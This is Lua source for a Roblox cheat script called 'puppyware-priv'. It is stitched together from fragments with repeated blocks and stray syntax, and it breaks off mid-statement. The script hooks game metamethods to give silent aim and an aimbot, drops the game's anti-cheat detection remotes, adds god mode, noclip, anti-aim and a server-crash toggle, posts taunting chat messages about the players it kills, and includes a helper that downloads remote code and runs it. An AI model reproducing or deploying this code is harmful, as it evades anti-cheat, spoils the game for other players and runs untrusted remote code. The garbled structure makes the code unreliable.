				if (not Settings.Whitelist.FriendsWhitelist or not Find(Settings.Whitelist.Friends, v.Name)) and (not Settings.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not Settings.Whitelist.Enabled or not Find(Settings.Whitelist.Players, v.Name)) then
					Target = v
					Distance = NearestToMouse
				end
			end
		end
	end

	return Target, Distance
end

Module.Functions.NearestRoot = function()
	local Target = nil
	local Distance = math.huge

	for _, v in next, Players:GetPlayers() do
		if Module.Functions.Network(v) and Module.Functions.Network(LocalPlayer) and v ~= LocalPlayer then
			local NearestToRoot = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude
			if Distance > NearestToRoot then
				if (not Settings.Whitelist.FriendsWhitelist or not Find(Settings.Whitelist.Friends, v.Name)) and (not Settings.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not Settings.Whitelist.Enabled or not Find(Settings.Whitelist.Players, v.Name)) then
					Target = v
					Distance = NearestToRoot
				end
			end
		end
	end

	return Target, Distance
end

Module.Functions.TargetCheck = function(Data)
	if Data == "Mouse" then
		return Module.Functions.NearestMouse()
	elseif Data == "Distance" then
		return Module.Functions.NearestRoot()
	end
end

Module.Functions.Invisible = function()
	if Module.Functions.Network(LocalPlayer) then
		Module.OldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
		wait(0.1)
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 96995694596945934234234234, 0)
		wait(0.1)
		LocalPlayer.Character.LowerTorso.Root:Destroy()
		for _, v in pairs(LocalPlayer.Character:GetChildren()) do
			if v:IsA("MeshPart") and not table.find(Module.Ignores, v.Name) then
				v:Destroy()
			end
		end
		wait(0.1)
		LocalPlayer.Character.HumanoidRootPart.CFrame = Module.OldCFrame
	end
end

Module.Functions.Jitter = function(Speed, Angle)
	if Module.Functions.Network(LocalPlayer) then
		local Jit = Speed or math.random(30, 90)
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) * CFrame.Angles(0, math.rad(Angle) + math.rad((math.random(1, 2) == 1 and Jit or -Jit)), 0) 
	end
end

Module.Functions.Spin = function(Speed)
	if Module.Functions.Network(LocalPlayer) then
		LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(Speed), 0)
	end
end

Module.Functions.HttpGet = function(Data)
	return loadstring(game:HttpGet(Data))()
end


Module.Functions.Init()





game:GetService("Workspace").Players.ChildRemoved:Connect(function(PlayerThatIsGone)
	if PlayerThatIsGone.Name == Settings.KillSay.OldPlayer and Settings.KillSay.Type == "After Dead" then
		if Settings.KillSay.CustomMessage then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.CustomMessageText:gsub("@s", Settings.KillSay.OldPlayer), "All")
		else
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.Message[math.random(1, 4)]:gsub("@s", Settings.KillSay.OldPlayer), "All")
		end
	end
end)

UserInputService.InputBegan:Connect(function(Key, Break)
	if Key.UserInputType == InputType.MouseButton2 and not Break then
		Settings.Aimbot.Aiming = true
	end
	if Key.UserInputType == InputType.MouseButton1 and not Break then
		if Module.Functions.Network(LocalPlayer) then
			if LocalPlayer.Character:FindFirstChildOfClass("Tool") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo").Value ~= 0 then
				Settings.KillSay.Cooldown = true
				spawn(function()
					wait(1)
					Settings.KillSay.Cooldown = false
				end)
			end
		end
		if Settings.SilentAim.Enabled and Settings.SilentAim.WallBang and Module.Functions.Network(LocalPlayer) then
			if not Module.Functions.IsVisible(Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart) and LocalPlayer.Character:FindFirstChildOfClass("Tool") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo").Value ~= 0 then
				if LocalPlayer.Character.RightHand:FindFirstChild("RightWrist") then
					LocalPlayer.Character.RightHand:FindFirstChild("RightWrist"):Destroy()
				end
				wait(0.1)
				LocalPlayer.Character.Humanoid:ChangeState(11)
				LocalPlayer.Character.RightHand.CFrame = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart.CFrame * CFrame.new(0, -1, 0)
			end
		end
	end
	if Key.KeyCode == Enum.KeyCode[Settings.Target.Bind] and not Break then
		if Settings.Target.Enabled then
			if Module.Functions.IsVisible(Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart) then
				Settings.Target.TargetUser = Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name
				Notify({
					Title = Script.Name .. " " .. Script.Version,
					Description = "Targetted " .. Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Name .. " (" .. Module.Functions.TargetCheck(Settings.SilentAim.Nearest).DisplayName .. ")",
					Duration = 3
				})
			end
		end
	end
end)

UserInputService.InputEnded:Connect(function(Key, Break)
	if Key.UserInputType == InputType.MouseButton2 and not Break then
		Settings.Aimbot.Aiming = false
	end
	if Key.UserInputType == InputType.MouseButton1 and not Break then
		if Module.Functions.Network(LocalPlayer) then
        --[[
            local GRightWrist = Instance.new("Motor6D", LocalPlayer.Character.RightHand)
            GRightWrist.C0 = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1)
            GRightWrist.C1 = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1)
            GRightWrist.CurrentAngle = 0
            GRightWrist.Name = "RightWrist"
            GRightWrist.Part0 = LocalPlayer.Character.RightLowerArm
            GRightWrist.Part1 = LocalPlayer.Character.RightHand
        ]]
			wait(0.75)
			LocalPlayer.Character.RightHand.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 1, 0)
		end
	end
end)

local __Index;
__Index = hookmetamethod(game, "__index", function(t, k)
	if t == Mouse and (tostring(k) == "Hit" or tostring(k) == "Target") then
		if Settings.Target.Enabled then
			if Settings.Target.TargetUser ~= nil then
				if Players:FindFirstChild(Settings.Target.TargetUser) ~= nil and Module.Functions.Network(Players[Settings.Target.TargetUser]) then
					if (not Settings.Target.WallCheck or Module.Functions.IsVisible(Players[Settings.Target.TargetUser].Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) then
						local TargetBody
						if Players[Settings.Target.TargetUser].Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall then
							TargetBody = Players[Settings.Target.TargetUser].Character.LeftFoot
						else
							TargetBody = Players[Settings.Target.TargetUser].Character[Settings.SilentAim.Hitbox]
						end
						local Prediction = TargetBody.CFrame + (TargetBody.Velocity * Settings.Prediction_Settings.Prediction)

						return (tostring(k) == "Hit" and Prediction or tostring(k) == "Target" and TargetBody)
					end
				end
			end
		else
			if Settings.SilentAim.Enabled then
				local NearestTarget, NearestPos = Module.Functions.TargetCheck(Settings.SilentAim.Nearest)
				if NearestTarget and (not Settings.SilentAim.VisibleCheck or Module.Functions.IsVisible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.SilentAim.FOV.Enabled or Settings.SilentAim.FOV.Size > NearestPos) then
					local TargetBody
					if NearestTarget.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall and Settings.SilentAim.Mode == "Insane" then
						TargetBody = NearestTarget.Character.LeftFoot
					else
						TargetBody = NearestTarget.Character[Settings.SilentAim.Hitbox]
					end

					local Prediction 
					if Settings.Prediction_Settings.AutoSettings then
						Prediction = TargetBody.CFrame + (TargetBody.Velocity * Settings.Prediction_Settings.Prediction)
					else
						Prediction = TargetBody.CFrame + (TargetBody.Velocity * 0.165)
					end

					return (tostring(k) == "Hit" and Prediction or tostring(k) == "Target" and TargetBody)
				end
			end
		end
	end

	return __Index(t, k)
end)

local __Namecall;
__Namecall = hookmetamethod(game, "__namecall", function(self, ...)
	local Args = {...}
	local Method = getnamecallmethod()

	if tostring(self.Name) == "MainEvent" and tostring(Method) == "FireServer" then
		if Args[1] == "TeleportDetect" or Args[1] == "CHECKER_1" or Args[1] == "OneMoreTime" then
			return
		end
	end

	return __Namecall(self, ...)
end)

if not Module.DrawingInstance["FOV"] then
	Module.DrawingInstance["FOV"] = Module.Drawing.Circle(1)
end

if not Module.DrawingInstance["FOV2"] then
	Module.DrawingInstance["FOV2"] = Module.Drawing.Circle(1)
end

RunService.RenderStepped:Connect(function()
	if Settings.Prediction_Settings.AutoSettings then
		local PingStats = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
		local Value = tostring(PingStats)
		local PingValue = Value:split(" ")
		local PingNumber = tonumber(PingValue[1])

		Settings.Prediction_Settings.Prediction = PingNumber / 1000 + 0.037
	end

	if Settings.Aimbot.Enabled and Settings.Aimbot.Aiming then
		local NearestTarget, NearestPos = Module.Functions.TargetCheck(Settings.Aimbot.Nearest)
		if NearestTarget and (not Settings.Aimbot.VisibleCheck or Module.Functions.IsVisible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.Aimbot.FOV.Enabled or Settings.Aimbot.FOV.Size > NearestPos) then
			local Prediction = NearestTarget.Character[Settings.Aimbot.Hitbox].CFrame + (NearestTarget.Character[Settings.Aimbot.Hitbox].Velocity * Settings.Prediction_Settings.Prediction)
			CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Prediction.Position)
		end
	end

	if Settings.SilentAim.FOV.Enabled then
		Module.DrawingInstance["FOV"].Visible = true
		Module.DrawingInstance["FOV"].Radius = Settings.SilentAim.FOV.Size
		Module.DrawingInstance["FOV"].Transparency = Settings.SilentAim.FOV.Transparency
		Module.DrawingInstance["FOV"].Filled = Settings.SilentAim.FOV.Filled
		if Settings.SilentAim.FOV.Shape == "Custom" then
			Module.DrawingInstance["FOV"].NumSides = Settings.SilentAim.FOV.Round
		elseif Settings.SilentAim.FOV.Shape == "Octagon" then
			Module.DrawingInstance["FOV"].NumSides = 12.5
		else 
			Module.DrawingInstance["FOV"].NumSides = 100
		end
		Module.DrawingInstance["FOV"].Color = Settings.SilentAim.FOV.Color
		Module.DrawingInstance["FOV"].Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
	else
		Module.DrawingInstance["FOV"].Visible = false
	end

	if Settings.Aimbot.FOV.Enabled then
		Module.DrawingInstance["FOV2"].Visible = true
		Module.DrawingInstance["FOV2"].Radius = Settings.Aimbot.FOV.Size
		Module.DrawingInstance["FOV2"].Transparency = Settings.Aimbot.FOV.Transparency
		Module.DrawingInstance["FOV2"].Filled = Settings.Aimbot.FOV.Filled
		if Settings.Aimbot.FOV.Shape == "Custom" then
			Module.DrawingInstance["FOV2"].NumSides = Settings.Aimbot.FOV.Round
		elseif Settings.Aimbot.FOV.Shape == "Octagon" then
			Module.DrawingInstance["FOV2"].NumSides = 12.5
		else 
			Module.DrawingInstance["FOV"].NumSides = 100
		end
		Module.DrawingInstance["FOV2"].Color = Settings.Aimbot.FOV.Color
		Module.DrawingInstance["FOV2"].Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
	else
		Module.DrawingInstance["FOV2"].Visible = false
	end

	if Module.Functions.Network(LocalPlayer) then
		local Char = LocalPlayer.Character
		local Root = Char.HumanoidRootPart
		local Hum = Char.Humanoid

		if Settings.ServerCrash.Enabled then
			Hum:ChangeState(11)
		end

		if Settings.Movement.CFrameSpeed then
			if Settings.Movement.Type == "Render" then
				if Hum.MoveDirection.Magnitude > 0 then
					Char:TranslateBy(Hum.MoveDirection)
				end
			end
		end
	end
end)

loadstring[[
game:GetService("RunService").Stepped:Connect(function() --// The broken part
    if Settings.AntiAim.UndergroundWallbang then
        for i, v in pairs(LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide == true then
                v.CanCollide = false
            end
        end
    end
end)
]]

RunService.Heartbeat:Connect(function()
	if Module.Functions.Network(LocalPlayer) then
		local Char = LocalPlayer.Character
		local Root = Char.HumanoidRootPart
		local Hum = Char.Humanoid

		if Settings.Movement.CFrameSpeed then
			if Settings.Movement.Type == "Heartbeat" then
				if Hum.MoveDirection.Magnitude > 0 then
					Char:TranslateBy(Hum.MoveDirection)
				end
			end
		end

		if Settings.SilentAim.LookAt then
			local PrimaryPartOfChar = Char.PrimaryPart
			local NearestMouse, NearestPos = Module.Functions.TargetCheck(Settings.SilentAim.Nearest)
			if Module.Functions.Network(NearestMouse) then
				if (not Settings.SilentAim.VisibleCheck or Module.Functions.IsVisible(NearestMouse.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.SilentAim.FOV.Enabled or Settings.SilentAim.FOV.Size > NearestPos) then
					local NearestChar = NearestMouse.Character
					local NearestRoot = NearestChar.HumanoidRootPart
					local NearestPos = CFrame.new(PrimaryPartOfChar.Position, Vector3.new(NearestRoot.Position.X, NearestRoot.Position.Y, NearestRoot.Position.Z))
					Char:SetPrimaryPartCFrame(NearestPos)
				end
			end
		end

		if Settings.AntiAim.NoAutoRotate then
			Hum.AutoRotate = false
		else
			Hum.AutoRotate = true
		end

		if Settings.AntiAim.AntiPointAt then
			for i, v in next, Players:GetPlayers() do
				if v ~= LocalPlayer and Module.Functions.Network(v) and Module.Functions.Network(LocalPlayer) then
					local BodyEffects = v.Character:FindFirstChild("BodyEffects")
					local MousePos = BodyEffects:FindFirstChild("MousePos")
					if BodyEffects ~= nil and MousePos ~= nil then
						local EnemyMouseMagnitude = (LocalPlayer.Character.HumanoidRootPart.Position - MousePos.Value).Magnitude
						if Settings.AntiAim.AntiPointAtDistance > EnemyMouseMagnitude then
							Root.CFrame = Root.CFrame * CFrame.new(math.random(1, 2) == 1 and 2 or -2, 0, 0)
						end
					end
				end
			end
		end

		if Settings.AntiAim.UndergroundWallbang then
			Hum:ChangeState(11)
		end

		if Settings.AntiAim.Enabled then
			if Settings.AntiAim.Type == "Jitter" then
				Module.Functions.Jitter(Settings.AntiAim.Speed, Settings.AntiAim.Angle)
			else
				Module.Functions.Spin(Settings.AntiAim.Speed)
			end
		end
	end
end)

		Settings.God.GodMelee = true
		Module.Functions.NilBody()





















end)













AddCommand("godbullet", {"fullgod"}, "fixes fling cmd", {}, function(Caller)






--[[

if getgenv().PuppywareSettings == nil then

    print("Cannot find your configuration.")

    getgenv().PuppywareSettings = {
        PerformanceMode = true,
        turksense = false,
        TargetKey = "E"
    }

end

wait(0.5)

]]



getgenv().PuppywareSettings = {
	PerformanceMode = true,
	turksense = false,
	TargetKey = "Q",
	Watermark = true
}


local PuppywareSettings = getgenv().PuppywareSettings

if PuppywareSettings == nil then

	getgenv().PuppywareSettings = {
		PerformanceMode = true,
		turksense = false,
		TargetKey = "E",
		Watermark = true
	}

end

local Script = {
	Version = "v0.0.5",
	Name = "puppyware-priv"
}

local Settings = {
	Prediction_Settings = {
		AutoSettings = false,
		Prediction = 0.165
	},
	KillSay = {
		Type = "After Dead",
		"",
		Cooldown = false,
		CustomMessage = false,
		CustomMessageText = "@s is tapped!",
		Message = {
			"@s is sus.",
			"nn tapped, @s bad cheat.",
			"puppyware on top, @s is clapped.",
			"@s is rekted.",
			"puppyware>you",
			"you are just bad get puppyware",
			"u rly thought",
			"bad boy clique",
			"noob",
			"xD",
			"why are you that bad son",
			"you shall quit"
		}
	},
	Aimbot = {
		Enabled = false,
		Aiming = false,
		FOV = {
			Enabled = false,
			Size = 100,
			Round = 100,
			Color = Color3.fromRGB(28, 56, 139),
			Shape = "Custom",
			Filled = false,
			Transparency = 0.5
		},
		Hitbox = "Head",
		Nearest = "Mouse",
		VisibleCheck = false,
		IgnoreFOV = false,
	},
	SilentAim = {
		Enabled = false,
		WallCheck = false,
		FOV = {
			Enabled = false,
			Size = 100,
			Round = 100,
			Color = Color3.fromRGB(28, 56, 139),
			Shape = "Custom",
			Filled = false,
			Transparency = 0.5
		},
		Hitbox = "Head",
		Nearest = "Mouse",
		Mode = "Normal",
		VisibleCheck = false,
		IgnoreFOV = false,
		LookAt = false,
	},
	Triggerbot = {
		Enabled = false,
		Delay = {
			Enabled = false,
			Value = 0
		}
	},
	AntiAim = {
		Enabled = false,
		Type = "Jitter",
		Angle = 20,
		Speed = 100,
		Underground = false,
		AntiPointAt = false,
		NoAutoRotate = false,
		AntiPointAtDistance = 20
	},
	Whitelist = {
		Players = {},
		Friends = {},
		Holder = "",
		Enabled = false,
		CrewEnabled = false,
		FriendsWhitelist = false
	},
	Movement = {
		CFrameSpeed = false,
		Type = "Render"
	},
	ServerCrash = {
		Enabled = false,
		Value = 0
	},
	God = {
		GodBullet = false,
		GodMelee = false,
		AntiRagdoll = false,
		IsStillAlive = false
	},
	Target = {
		Enabled = false,
		TargetUser = nil,
		WallCheck = false,
		Bind = PuppywareSettings.TargetKey
	}
}

local Service = setmetatable({}, {
	__index = function(t, k)
		return game:GetService(k)
	end
})

local WS = workspace
local Insert = table.insert
local Remove = table.remove
local Find = table.find
local Players = Service.Players
local LocalPlayer = Players.LocalPlayer
local CurrentCamera = WS.CurrentCamera
local WorldToViewPortPoint = CurrentCamera.WorldToViewportPoint
local Mouse = LocalPlayer:GetMouse()
local RunService = Service.RunService
local GuiInset = Service.GuiService:GetGuiInset()
local ReplicatedStorage = Service.ReplicatedStorage
local UserInputService = Service.UserInputService
local KeyCode = Enum.KeyCode
local InputType = Enum.UserInputType
local Material = Enum.Material
local UniversalAnimation = Instance.new("Animation")
local StarterGui = Service.StarterGui

local Module = {
	Instance = {},
	Players = {},
	DrawingInstance = {},
	OldCFrame,
	Ignores = {
		"UpperTorso",
		"LowerTorso",
		"Head",
		"LeftHand",
		"LeftUpperArm",
		"LeftLowerArm",
		"RightHand",
		"RightUpperArm",
		"RightLowerArm"
	},
	BodyParts = {
		"Head",
		"Torso",
		"HumanoidRootPart",
		"Left Arm",
		"Right Arm",
		"Left Leg",
		"Right Leg"
	},	
	Functions = {
		Network = function(Data)
			if Data and Data.Character and Data.Character:FindFirstChild("HumanoidRootPart") ~= nil and Data.Character:FindFirstChild("Humanoid") ~= nil and Data.Character:FindFirstChild("Head") ~= nil then
				return true
			end
			return false
		end,
		Cham = function(Data, State)
			local BoxVar = nil
			local GlowVar = nil
			if State then
				for _, v in pairs(Data.Character:GetChildren()) do
					if v:IsA("BasePart") and v.Transparency ~= 1 then
						if not v:FindFirstChild("Box") then
							BoxVar = Instance.new("BoxHandleAdornment", v)
							BoxVar.Name = "Box"
							BoxVar.AlwaysOnTop = true
							BoxVar.ZIndex = 4
							BoxVar.Adornee = v
							BoxVar.Color3 = Color3.fromRGB(0, 153, 153)
							BoxVar.Transparency = 0.5
							BoxVar.Size = v.Size + Vector3.new(0.02, 0.02, 0.02)
						end
					end
				end
			else
				for i, v in pairs(Data.Character:GetChildren()) do
					if v:IsA("BasePart") and v.Transparency ~= 1 then
						if v:FindFirstChild("Box") then
							v["Box"]:Destroy()
						end
					end
				end

				return BoxVar, GlowVar
			end
		end
	},
	Drawing = {
		Circle = function(Thickness)
			local Circle = Drawing.new("Circle")
			Circle.Transparency = 1
			Circle.Thickness = Thickness
			return Circle
		end
	},
}

Module.Functions.NoSpace = function(Data)
	return Data:gsub("%s+", "") or Data
end

Module.Functions.Find = function(Data)
	local Target = nil

	for i, v in next, Players:GetPlayers() do
		if v.Name ~= LocalPlayer.Name and v.Name:lower():match('^'.. Module.Functions.NoSpace(Data):lower()) then
			Target = v.Name
		end
	end

	return Target
end

Module.Functions.PlayAnimation = function(Data, SpeedData, ActionData)
	if Module.Functions.Network(LocalPlayer) then
		UniversalAnimation.AnimationId = "rbxassetid://" .. tostring(Data)
		local Track = LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(UniversalAnimation)
		if ActionData then
			Track.Priority = Enum.AnimationPriority.Action
		end
		if SpeedData ~= nil then
			Track:AdjustSpeed(SpeedData)
		end
		Track:Play()
	end
end

Module.Functions.StopAnimation = function()
	if Module.Functions.Network(LocalPlayer) then
		for _, v in next, LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
			if v.Animation.AnimationId:match("rbxassetid") then
				v:Stop()
			end
		end
	end
end

Module.Functions.Underground = function(Data)
	if Module.Functions.Network(LocalPlayer) then
		if Data then
			LocalPlayer.Character.Humanoid.HipHeight = -1
			Module.Functions.PlayAnimation(3152378852, nil, true)
		else
			LocalPlayer.Character.Humanoid.HipHeight = 2.1
			Module.Functions.StopAnimation()
		end
	end
end

Module.Functions.AntiHead = function(State)
	if Module.Functions.Network(LocalPlayer) then
		if State then
			Module.Functions.PlayAnimation(3189777795, 0.1, false)
		else
			Module.Functions.StopAnimation()
		end
	end
end

Module.Functions.IsVisible = function(OriginPart, Part)
	if Module.Functions.Network(LocalPlayer) then
		local IgnoreList = {CurrentCamera, LocalPlayer.Character, OriginPart.Parent}
		local Parts = CurrentCamera:GetPartsObscuringTarget(
			{
				OriginPart.Position, 
				Part.Position
			},
			IgnoreList
		)

		for i, v in pairs(Parts) do
			if v.Transparency >= 0.3 then
				Module.Instance[#Module.Instance + 1] = v
			end

			if v.Material == Enum.Material.Glass then
				Module.Instance[#Module.Instance + 1] = v
			end
		end

		return #Parts == 0
	end
	return true
end

Module.Functions.NilBody = function()
	if Module.Functions.Network(LocalPlayer) then
		for i, v in pairs(LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") or v:IsA("Part") or v:IsA("MeshPart") then
				if v.Name ~= "HumanoidRootPart" then
					v:Destroy()
				end
			end
		end
	end
end

Module.Functions.TableRemove = function(Data, Data2)
	for i, v in pairs(Data) do
		if v == Data2 then
			Remove(Data, i)
		end
	end
end

Module.Functions.GodFunc = function(Variable)
	LocalPlayer.Character.RagdollConstraints:Destroy()
	local Folder = Instance.new("Folder", LocalPlayer.Character)
	Folder.Name = "FULLY_LOADED_CHAR"
	wait()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
	Variable = false
end

Module.Functions.Init = function()
	for _, v in next, Players:GetPlayers() do
		if v ~= LocalPlayer and v:IsFriendsWith(LocalPlayer.UserId) then
			Insert(Settings.Whitelist.Friends, v.Name)
		end
	end

	Players.PlayerAdded:Connect(function(_Player)
		if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
			Insert(Settings.Whitelist.Friends, _Player.Name)
		end
	end)

	Players.PlayerRemoving:Connect(function(_Player)
		if _Player ~= LocalPlayer and _Player:IsFriendsWith(LocalPlayer.UserId) then
			Module.Functions.TableRemove(Settings.Whitelist.Friends, _Player.Name)
		end
	end)

	LocalPlayer.CharacterAdded:Connect(function()
		wait(0.5)
		Settings.God.IsStillAlive = false
		if LocalPlayer.Character:FindFirstChild("BodyEffects") then
			if Settings.God.GodBullet then
				Module.Functions.GodFunc(Settings.God.GodBullet)
				LocalPlayer.Character.BodyEffects.BreakingParts:Destroy()
			end
			if Settings.God.GodMelee then
				Module.Functions.GodFunc(Settings.God.GodMelee)
				Settings.God.IsStillAlive = true
				LocalPlayer.Character.BodyEffects.Armor:Destroy()
				LocalPlayer.Character.BodyEffects.Defense:Destroy()
			end
			if Settings.God.AntiRagdoll then
				Module.Functions.GodFunc(Settings.God.AntiRagdoll)
			end
		end
		wait(0.5)
		if Settings.AntiAim.Underground then
			Module.Functions.Underground(true)
		end
		wait(0.4)
		if Settings.AntiAim.UndergroundWallbang then
			Float = Instance.new("BodyVelocity")
			Float.Parent = LocalPlayer.Character.HumanoidRootPart
			Float.MaxForce = Vector3.new(100000, 100000, 100000)
			Float.Velocity = Vector3.new(0, 0, 0)
			wait(0.25)
			LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -11.5, 0)
			Module.Functions.Cham(LocalPlayer, true)
			Settings.AntiAim.UndergroundWallbang = true
		end
	end)
end

Module.Functions.NearestMouse = function()
	local Target = nil
	local Distance = math.huge

	for _, v in next, Players:GetPlayers() do
		if Module.Functions.Network(v) and v ~= LocalPlayer then
			local RootPosition, RootVisible = WorldToViewPortPoint(CurrentCamera, v.Character.HumanoidRootPart.Position)
			local NearestToMouse = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(RootPosition.X, RootPosition.Y)).magnitude
			if RootVisible and Distance > NearestToMouse then
				if (not Settings.Whitelist.FriendsWhitelist or not Find(Settings.Whitelist.Friends, v.Name)) and (not Settings.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not Settings.Whitelist.Enabled or not Find(Settings.Whitelist.Players, v.Name)) then
					Target = v
					Distance = NearestToMouse
				end
			end
		end
	end

	return Target, Distance
end

Module.Functions.NearestRoot = function()
	local Target = nil
	local Distance = math.huge

	for _, v in next, Players:GetPlayers() do
		if Module.Functions.Network(v) and Module.Functions.Network(LocalPlayer) and v ~= LocalPlayer then
			local NearestToRoot = (LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude
			if Distance > NearestToRoot then
				if (not Settings.Whitelist.FriendsWhitelist or not Find(Settings.Whitelist.Friends, v.Name)) and (not Settings.Whitelist.CrewEnabled or v:FindFirstChild("DataFolder") and v.DataFolder.Information:FindFirstChild("Crew") and not tonumber(v.DataFolder.Information.Crew.Value) == tonumber(LocalPlayer.DataFolder.Information.Crew.Value)) and (not Settings.Whitelist.Enabled or not Find(Settings.Whitelist.Players, v.Name)) then
					Target = v
					Distance = NearestToRoot
				end
			end
		end
	end

	return Target, Distance
end

Module.Functions.TargetCheck = function(Data)
	if Data == "Mouse" then
		return Module.Functions.NearestMouse()
	elseif Data == "Distance" then
		return Module.Functions.NearestRoot()
	end
end

Module.Functions.Invisible = function()
	if Module.Functions.Network(LocalPlayer) then
		Module.OldCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
		wait(0.1)
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 96995694596945934234234234, 0)
		wait(0.1)
		LocalPlayer.Character.LowerTorso.Root:Destroy()
		for _, v in pairs(LocalPlayer.Character:GetChildren()) do
			if v:IsA("MeshPart") and not table.find(Module.Ignores, v.Name) then
				v:Destroy()
			end
		end
		wait(0.1)
		LocalPlayer.Character.HumanoidRootPart.CFrame = Module.OldCFrame
	end
end

Module.Functions.Jitter = function(Speed, Angle)
	if Module.Functions.Network(LocalPlayer) then
		local Jit = Speed or math.random(30, 90)
		LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.Position) * CFrame.Angles(0, math.rad(Angle) + math.rad((math.random(1, 2) == 1 and Jit or -Jit)), 0) 
	end
end

Module.Functions.Spin = function(Speed)
	if Module.Functions.Network(LocalPlayer) then
		LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(Speed), 0)
	end
end

Module.Functions.HttpGet = function(Data)
	return loadstring(game:HttpGet(Data))()
end


Module.Functions.Init()





game:GetService("Workspace").Players.ChildRemoved:Connect(function(PlayerThatIsGone)
	if PlayerThatIsGone.Name == Settings.KillSay.OldPlayer and Settings.KillSay.Type == "After Dead" then
		if Settings.KillSay.CustomMessage then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.CustomMessageText:gsub("@s", Settings.KillSay.OldPlayer), "All")
		else
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.Message[math.random(1, 4)]:gsub("@s", Settings.KillSay.OldPlayer), "All")
		end
	end
end)

UserInputService.InputBegan:Connect(function(Key, Break)
	if Key.UserInputType == InputType.MouseButton2 and not Break then
		Settings.Aimbot.Aiming = true
	end
	if Key.UserInputType == InputType.MouseButton1 and not Break then
		if Module.Functions.Network(LocalPlayer) then
			if LocalPlayer.Character:FindFirstChildOfClass("Tool") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo").Value ~= 0 then
				Settings.KillSay.Cooldown = true
				spawn(function()
					wait(1)
					Settings.KillSay.Cooldown = false
				end)
			end
		end
		if Settings.SilentAim.Enabled and Settings.SilentAim.WallBang and Module.Functions.Network(LocalPlayer) then
			if not Module.Functions.IsVisible(Module.Functions.TargetCheck(Settings.SilentAim.Nearest).Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart) and LocalPlayer.Character:FindFirstChildOfClass("Tool") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo") and LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo").Value ~= 0 then
				if LocalPlayer.Character.RightHand:FindFirstChild("RightWrist") then
